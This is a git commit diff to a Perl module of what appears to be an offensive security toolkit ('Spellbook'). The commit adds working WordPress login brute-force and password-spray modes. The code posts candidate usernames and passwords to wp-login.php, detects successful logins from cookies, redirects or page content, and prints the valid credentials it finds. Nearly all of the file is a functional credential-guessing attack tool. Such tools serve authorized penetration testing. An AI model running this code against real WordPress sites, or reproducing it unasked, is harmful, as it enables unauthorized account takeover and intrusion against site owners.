2299f5e42373c5095d1af60c3ff248f9abfeef8d
htrgouvea <10741284+htrgouvea@users.noreply.github.com>
2026-01-14 08:29:13 -0300

    Add WordPress brute force and spray support (#141)

--- lib/Spellbook/Bruteforce/Wordpress.pm
+++ lib/Spellbook/Bruteforce/Wordpress.pm
@@ -1,61 +1,184 @@
 package Spellbook::Bruteforce::Wordpress {
     use strict;
     use warnings;
-    use LWP::UserAgent;
+    use Getopt::Long;
     use HTTP::Request::Common;
+    use Spellbook::Core::UserAgent;
+    use Spellbook::Helper::Read_File;
 
-    our $VERSION = '0.0.1';
+    our $VERSION = '0.0.2';
 
     sub new {
         my ($self, $parameters) = @_;
-        my ($help, $target, $username, $wordlist);
+        my ($help, $target, $username, $wordlist, $userlist, $password, $mode, @result);
 
         Getopt::Long::GetOptionsFromArray (
             $parameters,
             'h|help'       => \$help,
             't|target=s'   => \$target,
             'u|username=s' => \$username,
-            "w|wordlist=s" => \$wordlist
+            'w|wordlist=s' => \$wordlist,
+            'U|userlist=s' => \$userlist,
+            'p|password=s' => \$password,
+            'm|mode=s'     => \$mode
         );
 
-        if ($target) {
-            if ($target !~ /^http(s)?:\/\//){
-                $target = 'https://' . $target;
+        if ($help) {
+            return "
+                \rBruteforce::Wordpress
+                \r=========================
+                \r-h, --help         See this menu
+                \r-t, --target       Define the target
+                \r-u, --username     Define a single username for brute force
+                \r-w, --wordlist     Define a password wordlist for brute force
+                \r-U, --userlist     Define a username list for password spray
+                \r-p, --password     Define a single password for password spray
+                \r-m, --mode         Define bruteforce or spray\n\n";
+        }
+
+        if (!$target) {
+            return @result;
+        }
+
+        if ($target !~ /^http(s)?:\/\//) {
+            $target = 'https://' . $target;
+        }
+
+        if (!$mode) {
+            if ($username && $wordlist) {
+                $mode = 'bruteforce';
+            }
+        }
+
+        if (!$mode) {
+            if ($userlist && $password) {
+                $mode = 'spray';
+            }
+        }
+
+        if (!$mode) {
+            return @result;
+        }
+
+        my $login_url = $target;
+
+        if ($login_url !~ /wp-login\.php$/) {
+            if ($login_url !~ /\/$/) {
+                $login_url = $login_url . '/';
             }
 
+            $login_url = $login_url . 'wp-login.php';
+        }
+
+        my $userAgent = Spellbook::Core::UserAgent -> new();
+
+        if ($mode eq 'bruteforce') {
             if (!$username) {
-                $username = 'admin';
+                return @result;
             }
 
             if (!$wordlist) {
-                $wordlist = 'wordlists/passwords.txt';
+                return @result;
             }
 
-            my $wordlist_content = Spellbook::Helper::Read_File -> new(['--file' => $wordlist]);
-            my $userAgent = Spellbook::Core::UserAgent -> new();
+            my @passwords = Spellbook::Helper::Read_File -> new(['--file' => $wordlist]);
 
-            foreach my $password (@$wordlist_content) {
-                chomp($password);
+            foreach my $candidate_password (@passwords) {
+                chomp($candidate_password);
 
-                my $request = $useragent -> request(POST $target, [
-                    log => $username,
-                    pwd => $_,
+                my $response = $userAgent -> request(POST $login_url, [
+                    log         => $username,
+                    pwd         => $candidate_password,
+                    'wp-submit' => 'Log In',
+                    redirect_to => $target . '/wp-admin/',
+                    testcookie  => '1',
                 ]);
-                
-                my $response = $useragent -> request($req);
+                my $is_success = 0;
+                my $set_cookie = $response -> header('Set-Cookie');
 
-                if ($response -> is_success) {
-                    print "Successfully logged in with password: $_ \n";
+                if ($set_cookie) {
+                    if ($set_cookie =~ /wordpress_logged_in/) {
+                        $is_success = 1;
+                    }
+                }
+
+                my $location = $response -> header('Location');
+
+                if ($location) {
+                    if ($location =~ /wp-admin/) {
+                        $is_success = 1;
+                    }
+                }
+
+                my $content = $response -> decoded_content;
+
+                if ($content) {
+                    if ($content =~ /dashboard/i) {
+                        $is_success = 1;
+                    }
+                }
+
+                if ($is_success) {
+                    push @result, $username . ':' . $candidate_password;
+                    print "Valid credentials found: $username:$candidate_password\n";
                 }
             }
-            
         }
 
-        if ($help) {
-            return "";
+        if ($mode eq 'spray') {
+            if (!$userlist) {
+                return @result;
+            }
+
+            if (!$password) {
+                return @result;
+            }
+
+            my @usernames = Spellbook::Helper::Read_File -> new(['--file' => $userlist]);
+
+            foreach my $candidate_username (@usernames) {
+                chomp($candidate_username);
+
+                my $response = $userAgent -> request(POST $login_url, [
+                    log         => $candidate_username,
+                    pwd         => $password,
+                    'wp-submit' => 'Log In',
+                    redirect_to => $target . '/wp-admin/',
+                    testcookie  => '1',
+                ]);
+                my $is_success = 0;
+                my $set_cookie = $response -> header('Set-Cookie');
+
+                if ($set_cookie) {
+                    if ($set_cookie =~ /wordpress_logged_in/) {
+                        $is_success = 1;
+                    }
+                }
+
+                my $location = $response -> header('Location');
+
+                if ($location) {
+                    if ($location =~ /wp-admin/) {
+                        $is_success = 1;
+                    }
+                }
+
+                my $content = $response -> decoded_content;
+
+                if ($content) {
+                    if ($content =~ /dashboard/i) {
+                        $is_success = 1;
+                    }
+                }
+
+                if ($is_success) {
+                    push @result, $candidate_username . ':' . $password;
+                    print "Valid credentials found: $candidate_username:$password\n";
+                }
+            }
         }
 
-        return 0;
+        return @result;
     }
 }
 
